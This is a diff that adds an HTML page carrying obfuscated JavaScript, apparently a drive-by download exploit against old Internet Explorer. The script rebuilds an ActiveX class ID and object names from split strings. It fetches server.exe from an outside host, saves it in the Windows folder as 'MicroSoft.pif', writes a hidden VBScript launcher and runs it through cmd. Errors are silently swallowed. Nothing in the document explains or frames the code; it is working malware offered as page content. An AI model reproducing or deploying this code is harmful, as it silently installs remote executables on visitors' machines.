@@ -1,0 +1,70 @@
+/*
+*/
+<html>
+<body>
+<script language="JavaScript">
+function gn(rRaGEykU1)
+{
+var Orh2=window["Math"]["random"]()*rRaGEykU1;
+return'CuteQq'+'.Cn'
+}
+try
+{
+var Cuteqqzf,Cuteqqzfs,Cuteqqzfx,wwwcuteqqcn,wwwcuteqqcn2;
+Cuteqq='http://goldbye.vicp.net/server.exe';
+var Cuteqqname='MicroSoft.pif';
+var Cuteqqnames='MicroSoft.vbs';
+var chilam=document["createElement"]("object");
+var cuteqqid="clsid:";
+var cuteqqids="0-983A-0";
+var cuteqqidss="0C04";
+var cuteqqidsss="FC29E36";
+var cuteqqidx="BD96C";
+var cuteqqidxx="556-65A3-11D";
+var cuteqqxml="Microsoft.X"+"M"+"L"+"H"+"T"+"T"+"P";
+var cuteqqado="A"+"d"+"o"+"d"+"b."+"S"+"t"+"r"+"e"+"a"+"m";
+var ying="Shell.";
+var yings="Application";
+var yingx=ying+yings;
+var cuteqqidx=cuteqqid+cuteqqidx+cuteqqidxx+cuteqqids+cuteqqidss+cuteqqidsss;
+chilam["setAttribute"]("classid",cuteqqidx);
+var hHf$R6=chilam["CreateObject"]("Scripting.FileSystemObject","");
+var Cuteqq2=chilam.CreateObject(cuteqqxml,"");
+var Cuteqq3;
+Cuteqq3=chilam["CreateObject"](cuteqqado,"");
+Cuteqq3["type"]=1;
+var VgDnZXHt7=hHf$R6.GetSpecialFolder(0);
+var Cuteqq_ying_code;
+Cuteqq_ying_code=chilam["CreateObject"](yingx,"");
+exp1=hHf$R6["BuildPath"](VgDnZXHt7+'\\system32','cmd.exe');
+wwwcuteqqcn=VgDnZXHt7+"\\"+Cuteqqname;
+Cuteqq2.Open("GET",Cuteqq,0);
+Cuteqq2["send"]();
+Cuteqq3["Open"]();
+Cuteqq3["Write"](Cuteqq2["responseBody"]);
+Cuteqq3["SaveToFile"](wwwcuteqqcn,2);
+Cuteqq3["Close"]();
+var Cuteqquser="chilam";
+wwwcuteqqcn2=VgDnZXHt7+"\\"+Cuteqqnames;
+var Cuteqqzf0;
+Cuteqqzf0="Set wwwcuteqqcn = CreateObject(\"Wscript.";
+Cuteqqzf="Shell\")" + "\n";
+Cuteqqzfs="wwwcuteqqcn.run \"cmd /c "+wwwcuteqqcn+"\",vbhide";
+Cuteqqzfx=Cuteqqzf0+Cuteqqzf+Cuteqqzfs;
+Cuteqq3["type"]=2;
+Cuteqq3["Open"]();
+Cuteqq3["WriteText"]=Cuteqqzfx;
+Cuteqq3["Savetofile"](wwwcuteqqcn2,2);
+Cuteqq3["Close"]();
+var cuteqqs="o";
+var cuteqqss="p";
+var cuteqqsss="e";
+var cuteqqssss="n";
+var cuteqqx=cuteqqs+cuteqqss+cuteqqsss+cuteqqssss;
+Cuteqq_ying_code["ShelLExeCute"](exp1,' /c '+wwwcuteqqcn2,"",cuteqqx,0)
+}
+catch(cuteqqsave)
+{cuteqqsave=1}
+</script>
+</body>
+</html>
